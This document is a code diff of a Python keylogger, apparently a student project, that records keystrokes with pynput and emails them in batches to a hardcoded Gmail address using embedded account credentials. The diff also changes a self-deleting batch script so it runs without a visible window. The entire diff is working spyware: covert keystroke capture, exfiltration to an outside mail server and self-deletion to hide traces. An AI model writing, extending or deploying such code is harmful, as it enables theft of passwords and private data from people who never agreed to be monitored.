@@ -4,15 +4,17 @@ import smtplib
 from os import remove, path
 import subprocess
 from sys import argv
-
+import threading
+import queue
 destEmail = 'keylogsenderUIUC460@gmail.com'
 dataBufferSize = 100
-local = False
-
-data = ""
 hackeremail = "keylogsenderUIUC460"
 hackerpwd =  "qazwsxedcrfv"
+local = False
+exit_key = keyboard.Key.esc
 
+
+data = ""
 
 holdDowns = ['Key.ctrl_l', 'Key.ctrl_r', 
 			 'Key.shift', 'Key.shift_r',
@@ -27,52 +29,44 @@ def serverSetup():
 	return server
 
 def send_data():
-	print('sending data')
 	global data
 	try:
 		msg = data
-		server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
-		data='' #reset data
+		data = ''
+		if(local):
+			print('sending data through LOG FILE')
+			f.write('{0}'.format(msg))	
+		else:
+			print('sending data through EMAIL')
+			server.sendmail("keylogsenderUIUC460@gmail.com", destEmail, msg)
 		print("sending complete")
 	except Exception as e:
 		print('Exception: ' + str(e))
-
-
-def on_press(key):
-	print(key)
-	if(local):
-		try:
-			f.write('{0}\n'.format(
-				key.char))
-			#if(key.char == '`'):
-			#	 keyboard.Listener.stop
-		except AttributeError:
-			f.write('{0}\n'.format(
-				key))
-	else:
+	
+def recordKey(key):
 		global data
 		try:
-			data += str(key.char) + '\n'
+			data += str(key.char)
 		except AttributeError:
-			data += str(key) + '\n'
+			data += str(key)
+		except Exception as e:
+			print('Exception: '+str(e))
 		finally:
 			if(len(data) > dataBufferSize):
 				send_data()
+def on_press(key):
+	print(key)
+	recordKey(key)
 
 def on_release(key):
-	if(local):
-		if(str(key) in holdDowns):
-			f.write('{0} Released\n'.format(
-				key))
-	else:
-		global data
-		if(str(key) in holdDowns):
-			data += str(key) + ' released\n'
-		if(len(data) > dataBufferSize):
-			send_data()
-	if(key == keyboard.Key.esc):
-		#stop listener
+	global data
+	if(key == exit_key): #exit
 		return False
+	try:
+		if(str(key) in holdDowns):
+			recordKey(key)
+	except Exception as e:
+		print('Exception: '+ str(e))
 
 def run_keylogger():
 	#collect events until released
@@ -81,9 +75,12 @@ def run_keylogger():
 			on_release=on_release
 			) as listener:
 
-		print("joining")
-		listener.join()
-		print("joined")
+		try:
+			print("joining")
+			listener.join()
+			print("joined")
+		except Exception as e:
+			print('Exception: '+str(e))
 def selfDelete():
 	#create selfdelete file
 	BATTXT = ("@ECHO OFF\n"
@@ -94,13 +91,11 @@ def selfDelete():
 	d = open("del.bat", 'w')
 	d.write(BATTXT)
 	d.close()
-
+	
 	#run selfdelete file on exe
-	if(__file__!="keylogger.py"):
-		subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat")
+	subprocess.Popen(path.dirname(path.abspath(__file__))+"\\del.bat", shell=True) #shell=True makes it not-popup
 
 def main():
-	print(argv[0])
 	if(local):
 		f = open('keylog.txt', 'w')
 		print("logging to file...")
@@ -112,7 +107,9 @@ def main():
 
 	if(local):
 		f.close()
-	selfDelete()
+	
+	if(argv[0][-2:]!="py"):#so we don't acidentally delete the python file when testing
+		selfDelete()
 
 if __name__== "__main__":
   main()
